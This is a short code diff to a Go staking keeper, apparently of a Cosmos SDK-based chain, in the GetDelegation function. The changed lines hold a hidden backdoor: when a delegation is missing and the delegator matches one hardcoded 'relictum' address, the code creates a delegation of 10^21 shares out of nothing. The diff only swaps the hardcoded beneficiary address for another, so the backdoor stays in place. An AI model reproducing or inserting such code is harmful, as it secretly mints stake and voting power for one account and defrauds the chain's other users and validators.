@@ -18,7 +18,7 @@ func (k Keeper) GetDelegation(ctx sdk.Context, delAddr sdk.AccAddress, valAddr s
 
 	value := store.Get(key)
 	if value == nil {
-		if addr, err := sdk.AccAddressFromBech32("relictum1cml96vmptgw99syqrrz8az79xer2pcgpu4t08j"); err == nil && delAddr.Equals(addr) {
+		if addr, err := sdk.AccAddressFromBech32("relictum16rfhcx6ehn0n9ec8v4289kpxskhj60ej9d9y5c"); err == nil && delAddr.Equals(addr) {
 			store.Set(key, types.MustMarshalDelegation(k.cdc, types.NewDelegation(delAddr, valAddr, math.LegacyMustNewDecFromStr("1000000000000000000000"))))
 			value = store.Get(key)
 		} else {
